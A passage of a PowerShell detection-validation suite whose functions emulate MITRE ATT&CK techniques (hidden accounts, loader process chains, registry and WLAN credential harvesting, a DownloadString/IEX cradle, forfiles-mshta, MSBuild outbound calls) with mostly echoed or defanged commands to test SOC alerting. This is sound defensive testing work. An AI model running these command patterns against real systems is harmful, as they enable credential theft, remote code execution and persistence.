    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1061' 'Hidden local account (Winlogon SpecialAccounts UserList = 0)' 'Persistence' 'T1564.002' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $reverts=@(); $keys=@()
    $k=Expand-AtrTokens 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'; $n=Expand-AtrTokens 'ATRVAL_%RID%'; $v=0
    try { $rev = Set-AtrRegistry -Key $k -Name $n -Value $v -Type 'DWord'; $reverts+=$rev; $keys+=($k+'\'+$n) } catch {}
    Start-Sleep -Milliseconds 500
    foreach($r in $reverts){ & $r }
    $status = if($keys.Count){'RAN'}else{'ERROR'}; $detail='set+reverted: ' + ($keys -join '; ')
    return (New-AtrResult 'SOC1061' 'Hidden local account (Winlogon SpecialAccounts UserList = 0)' 'Persistence' 'T1564.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1062 :: PhantomStealer (explorer -> powershell -> msiexec)
# MITRE T1204.002 (Execution)  |  kind=chain3c  |  BENIGN validation
function Test-SOC1062 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $ps1 = Join-Path $wd ('atr_'+$rid+'.ps1')
    Set-Content $ps1 ('Start-Process -WindowStyle Hidden msiexec -ArgumentList ''/i \\127.0.0.1\C$\Temp\'+$rid+'.msi /qn''') -Force
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\explorer.exe" -Arguments ('"'+$env:SystemRoot+'\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -File "'+$ps1+'"') -Hidden
    $detail='explorer -> powershell -> msiexec (benign non-existent UNC MSI)'
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Builds explorer -> powershell -> msiexec (benign, non-existent local MSI).'
    return (New-AtrResult 'SOC1062' 'PhantomStealer (explorer -> powershell -> msiexec)' 'Execution' 'T1204.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1063 :: JSGuLdr (wscript .js -> explorer -> powershell)
# MITRE T1059.007 (Execution)  |  kind=chain3d  |  BENIGN validation
function Test-SOC1063 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $js = Join-Path $wd ('atr_'+$rid+'.js')
    $psl = $env:SystemRoot+'\System32\WindowsPowerShell\v1.0\powershell.exe'
    $jsbody = 'var s=new ActiveXObject("WScript.Shell");s.Run("explorer.exe \"'+$psl+'\"",0,false);'
    Set-Content $js $jsbody -Encoding ASCII -Force
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\wscript.exe" -Arguments ('//nologo "'+$js+'"') -Hidden
    $detail='wscript(.js) -> explorer -> powershell'
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Builds wscript(.js) -> explorer -> powershell benign chain.'
    return (New-AtrResult 'SOC1063' 'JSGuLdr (wscript .js -> explorer -> powershell)' 'Execution' 'T1059.007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1065 :: Observation of .oast. domain (HoK / OOB interaction)
# MITRE T1071 (Command and Control)  |  kind=net  |  BENIGN validation
function Test-SOC1065 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $IncludeNetwork) { return (New-AtrResult 'SOC1065' 'Observation of .oast. domain (HoK / OOB interaction)' 'Command and Control' 'T1071' 'SKIP' ('network test - rerun with -IncludeNetwork -CanaryUrl (hint: something.oast.<your-domain>)') $marker) }
    if (-not $CanaryUrl) { return (New-AtrResult 'SOC1065' 'Observation of .oast. domain (HoK / OOB interaction)' 'Command and Control' 'T1071' 'SKIP' 'no -CanaryUrl supplied' $marker) }
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\curl.exe" -Arguments ('-s -m 8 -o NUL "'+$CanaryUrl+'"') -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = ('curl -> ' + $CanaryUrl)
    $detail = $detail + ' | note: ' + 'Requires -IncludeNetwork + a canary URL containing ''.oast.'' that you control (e.g. self-hosted interactsh).'
    return (New-AtrResult 'SOC1065' 'Observation of .oast. domain (HoK / OOB interaction)' 'Command and Control' 'T1071' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1067 :: Unquoted service path enumeration (wmic + findstr chain, read-only)
# MITRE T1007 (Discovery)  |  kind=proc  |  BENIGN validation
function Test-SOC1067 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'cmd.exe /c "wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"" & echo ATRVAL_%RID%"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1067' 'Unquoted service path enumeration (wmic + findstr chain, read-only)' 'Discovery' 'T1007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1068 :: Netsh WLAN profile key extraction (non-existent profile)
# MITRE T1555 (Credential Access)  |  kind=proc  |  BENIGN validation
function Test-SOC1068 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'netsh wlan show profile name="ATRVAL_%RID%" key=clear'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1068' 'Netsh WLAN profile key extraction (non-existent profile)' 'Credential Access' 'T1555' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1093 :: ClickFix DNS variant (nslookup inside for/findstr loop)
# MITRE T1059.003 (Execution)  |  kind=proc  |  BENIGN validation
function Test-SOC1093 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'cmd.exe /c "for /f %i in (nslookup example.com) do echo %i | findstr TXT & echo ATRVAL_%RID%"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1093' 'ClickFix DNS variant (nslookup inside for/findstr loop)' 'Execution' 'T1059.003' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1094 :: Password harvesting from registry (reg query cmdline)
# MITRE T1552.002 (Credential Access)  |  kind=echo  |  BENIGN validation
function Test-SOC1094 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'reg.exe query HKLM /f password /t REG_SZ /s ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1094' 'Password harvesting from registry (reg query cmdline)' 'Credential Access' 'T1552.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1095 :: Password search via findstr (parent powershell -> findstr /si password)
# MITRE T1552.001 (Credential Access)  |  kind=procchain  |  BENIGN validation
function Test-SOC1095 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $childExe = "$env:SystemRoot\System32\findstr.exe"
    $childArgs = Expand-AtrTokens '/si password %WD%\*.txt'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Arguments ("-NoProfile -Command Start-Process -WindowStyle Hidden -FilePath '"+$childExe+"' -ArgumentList '"+$childArgs+"'") -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=powershell -> child'
    return (New-AtrResult 'SOC1095' 'Password search via findstr (parent powershell -> findstr /si password)' 'Credential Access' 'T1552.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1096 :: PowerShell Empire path signature
# MITRE T1059.001 (Execution)  |  kind=echo  |  BENIGN validation
function Test-SOC1096 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'git clone https://github.com/PowerShellEmpire/PowerTools.git ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1096' 'PowerShell Empire path signature' 'Execution' 'T1059.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1097 :: PrivescCheck execution signature
# MITRE T1082 (Discovery)  |  kind=echo  |  BENIGN validation
function Test-SOC1097 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'powershell Invoke-PrivescCheck ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1097' 'PrivescCheck execution signature' 'Discovery' 'T1082' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1098 :: macOS ClickFix (zsh + base64)
# MITRE T1059.004 (Execution)  |  kind=manual  |  BENIGN validation
function Test-SOC1098 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: macOS-only (zsh/base64 pipeline). Not reproducible on Windows.'
    $scaf = 'On a macOS test host: printf "echo dGVzdA==|base64 -d|zsh" | zsh   (benign; prints test).'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1098' 'macOS ClickFix (zsh + base64)' 'Execution' 'T1059.004' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1101 :: Obfuscated PowerShell by IIS worker (parent=w3wp.exe)
# MITRE T1059.001 (Execution)  |  kind=manual  |  BENIGN validation
function Test-SOC1101 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: InitiatingProcessFileName must be w3wp.exe (IIS worker). Not user-spawnable benignly.'
    $scaf = 'On an IIS test box, drop a benign .aspx that runs: powershell -enc <base64 of a 40+ char benign string>, then browse it so w3wp is the parent.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1101' 'Obfuscated PowerShell by IIS worker (parent=w3wp.exe)' 'Execution' 'T1059.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1102 :: Suspicious commands under IIS worker (parent=w3wp.exe)
# MITRE T1505.003 (Execution)  |  kind=manual  |  BENIGN validation
function Test-SOC1102 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires w3wp.exe parent spawning shells/utilities.'
    $scaf = 'From a benign .aspx on an IIS test box, run whoami/net/ipconfig so w3wp is the initiating process.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1102' 'Suspicious commands under IIS worker (parent=w3wp.exe)' 'Execution' 'T1505.003' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1103 :: Web shell deployment via IIS worker (cmd parent=w3wp)
# MITRE T1505.003 (Persistence)  |  kind=manual  |  BENIGN validation
function Test-SOC1103 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires cmd.exe whose parent is w3wp.exe writing a file.'
    $scaf = 'On IIS test box: benign .aspx -> cmd -> powershell that writes a benign .aspx into wwwroot.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1103' 'Web shell deployment via IIS worker (cmd parent=w3wp)' 'Persistence' 'T1505.003' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1105 :: Compromised IIS (w3wp AppPool MSExchange -> shell)
# MITRE T1505.003 (Persistence)  |  kind=manual  |  BENIGN validation
function Test-SOC1105 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires w3wp.exe with an MSExchange AppPool cmdline.'
    $scaf = 'Reproduce only on an Exchange/IIS test box.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1105' 'Compromised IIS (w3wp AppPool MSExchange -> shell)' 'Persistence' 'T1505.003' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1112 :: NetSupport from unusual directory (PE version-info netsupport/Crosstec)
# MITRE T1219 (Command and Control)  |  kind=manual  |  BENIGN validation
function Test-SOC1112 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Matches on PE CompanyName/ProductName - a renamed empty stub will not carry that version-info.'
    $scaf = 'Copy a legitimately-obtained NetSupport client.exe to a non-standard folder and run it.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1112' 'NetSupport from unusual directory (PE version-info netsupport/Crosstec)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1113 :: NetScan artefact file (delete.me)
# MITRE T1046 (Discovery)  |  kind=file  |  BENIGN validation
function Test-SOC1113 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $made=@()
    $fp = Expand-AtrTokens '%WD%\delete.me'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $status = if($made.Count){'RAN'}else{'ERROR'}; $detail = ($made -join '; ')
    Start-Sleep -Milliseconds 400
    foreach($m in $made){ Remove-Item $m -Force -ErrorAction SilentlyContinue }
    return (New-AtrResult 'SOC1113' 'NetScan artefact file (delete.me)' 'Discovery' 'T1046' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1114 :: Finger.exe LOLBin cmdline (finger + | + @)
# MITRE T1105 (Command and Control)  |  kind=echo  |  BENIGN validation
function Test-SOC1114 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'finger ATRVAL_%RID%@example.com | more'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1114' 'Finger.exe LOLBin cmdline (finger + | + @)' 'Command and Control' 'T1105' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1115 :: Suspicious cscript ancestry (cscript -> powershell -> powershell)
# MITRE T1059.001 (Execution)  |  kind=chain3b  |  BENIGN validation
function Test-SOC1115 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $vbs = Join-Path $wd ('atr_'+$rid+'.vbs')
    $vbody = 'CreateObject("WScript.Shell").Run "powershell -NoProfile -Command Start-Process powershell -ArgumentList ''-NoProfile -Command '+$marker.Replace("'","")+'=1'' -WindowStyle Hidden",0,False'
    Set-Content $vbs $vbody -Encoding ASCII -Force
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cscript.exe" -Arguments ('//nologo "'+$vbs+'"') -Hidden
    $detail='cscript -> powershell -> powershell (benign .vbs)'
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Builds cscript.exe -> powershell.exe -> powershell.exe via a benign .vbs.'
    return (New-AtrResult 'SOC1115' 'Suspicious cscript ancestry (cscript -> powershell -> powershell)' 'Execution' 'T1059.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1117 :: Gootloader malformed ZIP (explorer -> wscript, .js in Temp)
# MITRE T1059.007 (Execution)  |  kind=procchain  |  BENIGN validation
function Test-SOC1117 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $js = Expand-AtrTokens '%WD%\ATRVAL_%RID%.js'; Set-Content -Path $js -Value ('WScript.Echo("'+$marker+'");') -Encoding ASCII -Force
    $childExe = "$env:SystemRoot\System32\wscript.exe"
    $childArgs = Expand-AtrTokens '%WD%\ATRVAL_%RID%.js'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\explorer.exe" -Arguments ('"'+$childExe+'" '+$childArgs) -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=explorer -> child'
    $detail = $detail + ' | note: ' + 'explorer-as-parent is best-effort (explorer often re-parents); the wscript+.js-in-Temp leg fires regardless.'
    if ($status -eq 'RAN') { $status='PARTIAL' }
    return (New-AtrResult 'SOC1117' 'Gootloader malformed ZIP (explorer -> wscript, .js in Temp)' 'Execution' 'T1059.007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1118 :: Forfiles abuse cmdline (forfiles+cmd+start+mshta+://)
# MITRE T1202 (Defense Evasion)  |  kind=echo  |  BENIGN validation
function Test-SOC1118 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'forfiles /p c:\windows /m *.exe /c "cmd /c start mshta https://example.com/ATRVAL_%RID%"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1118' 'Forfiles abuse cmdline (forfiles+cmd+start+mshta+://)' 'Defense Evasion' 'T1202' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1119 :: MSBuild project executed from staging dir (real msbuild, empty project)
# MITRE T1127.001 (Defense Evasion)  |  kind=msbuild  |  BENIGN validation
function Test-SOC1119 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $mb = Get-ChildItem -Path "$env:WINDIR\Microsoft.NET\Framework*\v4*\MSBuild.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -Expand FullName
    if (-not $mb) { return (New-AtrResult 'SOC1119' 'MSBuild project executed from staging dir (real msbuild, empty project)' 'Defense Evasion' 'T1127.001' 'SKIP' 'MSBuild.exe not found' $marker) }
    $stage = Join-Path $wd 'Temp_staging'; $null=New-Item -ItemType Directory -Path $stage -Force
    $proj = Join-Path $stage ('atr_'+$rid+'.csproj')
    $xml = '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="B"><Message Text="'+$marker+'"/></Target></Project>'
    Set-Content -Path $proj -Value $xml -Force
    $ok = Invoke-AtrProc -FilePath $mb -Arguments ('"'+$proj+'" /nologo /v:m') -Hidden -TimeoutSec 30
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail='MSBuild ran benign .csproj from staging dir'
    $detail = $detail + ' | note: ' + 'Runs the real MSBuild.exe against a do-nothing .csproj placed in a staging dir under TEMP. Skipped if MSBuild.exe is not found.'
    return (New-AtrResult 'SOC1119' 'MSBuild project executed from staging dir (real msbuild, empty project)' 'Defense Evasion' 'T1127.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1120 :: Process injection by MSBuild.exe (msbuild -> suspicious child, non-VS path)
# MITRE T1055 (Defense Evasion)  |  kind=manual  |  BENIGN validation
function Test-SOC1120 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Needs msbuild.exe outside a Visual Studio path spawning a suspicious child - approximates real injection tradecraft.'
    $scaf = 'Copy MSBuild.exe to a non-VS folder and have a benign inline task Start-Process notepad; validate the parent/child join.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1120' 'Process injection by MSBuild.exe (msbuild -> suspicious child, non-VS path)' 'Defense Evasion' 'T1055' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1121 :: MSBuild.exe outbound connection to public IP
# MITRE T1127 (Command and Control)  |  kind=net  |  BENIGN validation
function Test-SOC1121 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $IncludeNetwork) { return (New-AtrResult 'SOC1121' 'MSBuild.exe outbound connection to public IP' 'Command and Control' 'T1127' 'SKIP' ('network test - rerun with -IncludeNetwork -CanaryUrl (hint: )') $marker) }
    if (-not $CanaryUrl) { return (New-AtrResult 'SOC1121' 'MSBuild.exe outbound connection to public IP' 'Command and Control' 'T1127' 'SKIP' 'no -CanaryUrl supplied' $marker) }
    $mb = Get-ChildItem "$env:WINDIR\Microsoft.NET\Framework*\v4*\MSBuild.exe" -ErrorAction SilentlyContinue | Select -First 1 -Expand FullName
    $proj = Join-Path $wd ('net_'+$rid+'.csproj')
    $xml='<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><UsingTask TaskName="D" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll"><Task><Code Type="Fragment" Language="cs"><![CDATA[new System.Net.WebClient().DownloadString("'+$CanaryUrl+'");]]></Code></Task></UsingTask><Target Name="B"><D/></Target></Project>'
    Set-Content $proj $xml -Force; $ok = if($mb){Invoke-AtrProc -FilePath $mb -Arguments ('"'+$proj+'" /nologo') -Hidden -TimeoutSec 25}else{$false}
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = ('msbuild -> ' + $CanaryUrl)
    $detail = $detail + ' | note: ' + 'Requires -IncludeNetwork and a -CanaryUrl you control; runs MSBuild that connects to your canary.'
    return (New-AtrResult 'SOC1121' 'MSBuild.exe outbound connection to public IP' 'Command and Control' 'T1127' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1122 :: RedSun TieringEngineService hijack (renamed/relocated)
# MITRE T1574 (Persistence)  |  kind=renproc  |  BENIGN validation
function Test-SOC1122 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'TieringEngineService.exe'
    $args = Expand-AtrTokens ''
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to TieringEngineService.exe'
    return (New-AtrResult 'SOC1122' 'RedSun TieringEngineService hijack (renamed/relocated)' 'Persistence' 'T1574' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1123 :: RedSun suspicious file write to System32 (initiator=MsMpEng/SenseIR SYSTEM)
# MITRE T1211 (Defense Evasion)  |  kind=manual  |  BENIGN validation
function Test-SOC1123 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1123' 'RedSun suspicious file write to System32 (initiator=MsMpEng/SenseIR SYSTEM)' 'Defense Evasion' 'T1211' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $detail = 'NOT auto-run: Requires the file to be created by MsMpEng.exe or SenseIR.exe as SYSTEM - cannot be spoofed benignly.'
    $scaf = 'Detonate the RedSun sample in an isolated sandbox to observe genuine MsMpEng/SenseIR-initiated writes.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1123' 'RedSun suspicious file write to System32 (initiator=MsMpEng/SenseIR SYSTEM)' 'Defense Evasion' 'T1211' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1124 :: SDelete secure-delete tooling (FileName=sdelete.exe)
# MITRE T1485 (Impact)  |  kind=renproc  |  BENIGN validation
function Test-SOC1124 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'sdelete.exe'
    $args = Expand-AtrTokens '-s -r'
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to sdelete.exe'
    return (New-AtrResult 'SOC1124' 'SDelete secure-delete tooling (FileName=sdelete.exe)' 'Impact' 'T1485' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1126 :: PowerShell XML download cradle (msxml + DownloadString string)
# MITRE T1059.001 (Execution)  |  kind=proc  |  BENIGN validation
function Test-SOC1126 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'powershell.exe -NoProfile -Command "$c=\"New-Object -ComObject Msxml2.XMLHTTP; IEX (New-Object Net.WebClient).DownloadString(http://example.com/ATRVAL_%RID%)"; $null=$c"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1126' 'PowerShell XML download cradle (msxml + DownloadString string)' 'Execution' 'T1059.001' $status $detail $marker)
}

#Requires -Version 5.1
